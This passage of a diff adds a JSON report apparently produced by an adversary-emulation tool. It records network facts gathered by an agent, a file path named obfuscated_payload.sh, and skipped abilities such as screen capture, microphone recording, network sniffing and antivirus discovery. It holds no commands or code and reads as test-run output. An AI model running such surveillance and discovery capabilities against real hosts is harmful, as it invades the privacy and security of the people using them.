+        "a9eda2c6-e2f7-41a7-80a9-62425aa67565"
+      ],
+      "relationships": [],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/obfuscated_payload.sh:",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/obfuscated_payload.sh:",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:53:25Z",
+      "technique_id": "T1016",
+      "origin_type": "LEARNED",
+      "links": [
+        "0d06921a-e7dc-4ede-9200-3a5dc944f29f"
+      ],
+      "relationships": [
+        "wifi.network.ssid(-999                  Wired connection 1)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "wifi.network.ssid-999                  Wired connection 1",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "wifi.network.ssid",
+      "limit_count": -1,
+      "trait": "wifi.network.ssid",
+      "value": "-999                  Wired connection 1",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:53:25Z",
+      "technique_id": "T1016",
+      "origin_type": "LEARNED",
+      "links": [
+        "0d06921a-e7dc-4ede-9200-3a5dc944f29f"
+      ],
+      "relationships": [
+        "wifi.network.ssid(-999                  Conexão cabeada 1)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "wifi.network.ssid-999                  Conexão cabeada 1",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "wifi.network.ssid",
+      "limit_count": -1,
+      "trait": "wifi.network.ssid",
+      "value": "-999                  Conexão cabeada 1",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:53:25Z",
+      "technique_id": "T1016",
+      "origin_type": "LEARNED",
+      "links": [
+        "0d06921a-e7dc-4ede-9200-3a5dc944f29f"
+      ],
+      "relationships": [
+        "wifi.network.ssid(0                     lo)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "wifi.network.ssid0                     lo",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "wifi.network.ssid",
+      "limit_count": -1,
+      "trait": "wifi.network.ssid",
+      "value": "0                     lo",
+      "score": 1
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "reqnhl": [
+        {
+          "reason": "Executor not available",
+          "reason_id": 1,
+          "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
+          "ability_name": "Screen Capture"
+        },
+        {
+          "reason": "Executor not available",
+          "reason_id": 1,
+          "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
+          "ability_name": "Get Chrome Bookmarks"
+        },
+        {
+          "reason": "Executor not available",
+          "reason_id": 1,
+          "ability_id": "78524da1-f347-4fbb-9295-209f1f408330",
+          "ability_name": "Record microphone"
+        },
+        {
+          "reason": "Executor not available",
+          "reason_id": 1,
+          "ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba",
+          "ability_name": "Discover antivirus programs"
+        },
+        {
+          "reason": "Executor not available",
+          "reason_id": 1,
+          "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+          "ability_name": "Sniff network traffic"
+        },
+        {
+          "reason": "Executor not available",
+          "reason_id": 1,
+          "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb",
+          "ability_name": "Add bookmark"
+        }
+      ]
+    }
+  ]
+}
